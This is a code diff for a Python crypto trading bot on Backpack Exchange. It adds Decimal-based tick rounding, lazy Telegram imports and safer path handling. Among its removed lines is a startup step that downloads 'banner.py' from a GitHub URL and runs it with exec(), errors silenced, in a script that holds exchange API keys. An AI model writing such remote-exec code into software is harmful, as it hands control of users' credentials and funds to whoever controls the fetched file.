@@ -1,12 +1,11 @@
 import json
 from os import getenv
+from pathlib import Path
+from decimal import Decimal, ROUND_DOWN
 from dotenv import load_dotenv
 from time import sleep
 import logging
 import random
-import requests
-from telethon.sync import TelegramClient
-from telethon.tl.functions.messages import SendMessageRequest
 from helpers.backpack_exchange import BackpackExchange
 from helpers.public_API import PublicClient
 from helpers.orders import close_all_orders, close_all_positions
@@ -19,17 +18,23 @@ logging.basicConfig(
     filemode="a"
 )
 
-load_dotenv()
+BASE_DIR = Path(__file__).resolve().parent
+load_dotenv(BASE_DIR / ".env")
 
 TELEGRAM_INFO = {
     "MSG_TO": getenv("TELEGRAM_MSG_TO"),
-    "API_ID": int(getenv("TELEGRAM_API_ID")),
+    "API_ID": getenv("TELEGRAM_API_ID"),
     "API_HASH": getenv("TELEGRAM_API_HASH"),
     "BOT_TOKEN": getenv("TELEGRAM_BOT_TOKEN")
 }
 
 def send_bot_message(message: str):
-    with TelegramClient('telegram_bp_bot', TELEGRAM_INFO["API_ID"], TELEGRAM_INFO["API_HASH"]).start(bot_token=TELEGRAM_INFO["BOT_TOKEN"]) as client:
+    from telethon.sync import TelegramClient
+    from telethon.tl.functions.messages import SendMessageRequest
+
+    if not all(TELEGRAM_INFO.values()):
+        raise ValueError("Telegram alerts require all TELEGRAM_* environment variables")
+    with TelegramClient('telegram_bp_bot', int(TELEGRAM_INFO["API_ID"]), TELEGRAM_INFO["API_HASH"]).start(bot_token=TELEGRAM_INFO["BOT_TOKEN"]) as client:
         try:
             entity = client.get_input_entity(TELEGRAM_INFO["MSG_TO"])
             client(SendMessageRequest(peer=entity, message=message, no_webpage=True))
@@ -39,7 +44,7 @@ def send_bot_message(message: str):
 
 
 # Load settings from settings.json
-with open("settings.json", "r") as f:
+with open(BASE_DIR / "settings.json", "r", encoding="utf-8") as f:
     settings = json.load(f)
 
 TOTAL_TRADES = settings["TOTAL_TRADES"]
@@ -55,11 +60,13 @@ TAKE_PROFIT_USDC = settings["TAKE_PROFIT_USDC"]
 AUTO_REPAY_BORROWS = settings["AUTO_REPAY_BORROWS"]
 TELEGRAM_ALERT = settings["TELEGRAM_ALERT"]
 
-def format_decimal(value: any, tick_size: any) -> float:
-    tick_size = str(tick_size)
-    decimal_places = tick_size[::-1].find('.') if '.' in tick_size else 0
-    formatted_value = f"{float(value):.{decimal_places}f}"
-    return float(formatted_value)
+def format_decimal(value, tick_size) -> str:
+    """Round down to an actual tick/step multiple without float serialization."""
+    value, increment = Decimal(str(value)), Decimal(str(tick_size))
+    if not value.is_finite() or not increment.is_finite() or increment <= 0:
+        raise ValueError("Value must be finite and tick/step must be positive")
+    rounded = (value / increment).to_integral_value(rounding=ROUND_DOWN) * increment
+    return format(rounded, "f")
 
 def validate_inputs(limit_price_percentage: float, trade_side: str) -> bool:
     if not (0 < limit_price_percentage <= 100):  # Adjusted validation for percentage
@@ -84,15 +91,19 @@ def get_market_data(public_client: PublicClient, trading_pair: str):
         return None, None, None
 
 def calculate_prices(trade_side: str, current_price: float, limit_price_percentage: float, stop_loss_percentage: float, take_profit_percentage: float, tick_size: str):
+    current_price = Decimal(str(current_price))
+    limit_price_percentage = Decimal(str(limit_price_percentage))
+    stop_loss_percentage = Decimal(str(stop_loss_percentage))
+    take_profit_percentage = Decimal(str(take_profit_percentage))
     if trade_side == "LONG":
         # Limit price is lower than current price by limit_price_percentage
         limit_price = format_decimal(current_price * (1 - limit_price_percentage / 100), tick_size)
-        stop_loss_price = format_decimal(limit_price * (1 - stop_loss_percentage / 100), tick_size)
-        take_profit_price = format_decimal(limit_price * (1 + take_profit_percentage / 100), tick_size)
+        stop_loss_price = format_decimal(Decimal(limit_price) * (1 - stop_loss_percentage / 100), tick_size)
+        take_profit_price = format_decimal(Decimal(limit_price) * (1 + take_profit_percentage / 100), tick_size)
     else:  # SHORT
         limit_price = format_decimal(current_price * (1 + limit_price_percentage / 100), tick_size)
-        stop_loss_price = format_decimal(limit_price * (1 + stop_loss_percentage / 100), tick_size)
-        take_profit_price = format_decimal(limit_price * (1 - take_profit_percentage / 100), tick_size)
+        stop_loss_price = format_decimal(Decimal(limit_price) * (1 + stop_loss_percentage / 100), tick_size)
+        take_profit_price = format_decimal(Decimal(limit_price) * (1 - take_profit_percentage / 100), tick_size)
     return limit_price, stop_loss_price, take_profit_price
 
 def start_trading(
@@ -122,7 +133,7 @@ def start_trading(
         trade_side, current_price, limit_price_percentage, stop_loss_percentage, take_profit_percentage, tick_size
     )
 
-    quantity = format_decimal(trading_amount / limit_price, tick_size=step_size)
+    quantity = format_decimal(Decimal(str(trading_amount)) / Decimal(limit_price), tick_size=step_size)
     # logging.info(f"Calculated quantity: {quantity}")
 
     order_side = OrderSide.BUY.value if trade_side == "LONG" else OrderSide.SELL.value
@@ -175,12 +186,8 @@ def countdown_sleep(min_sleep: int, max_sleep: int):
     print('====================================================\n')
 
 if __name__ == "__main__":
-    try:
-        url = "https://raw.githubusercontent.com/solotop999/banner/main/banner.py"
-        response = requests.get(url)
-        exec(response.text)
-    except: pass
-    
+    print("Backpack Exchange trading client")
+
     API_KEY = getenv("API_KEY")
     API_SECRET = getenv("API_SECRET")
 
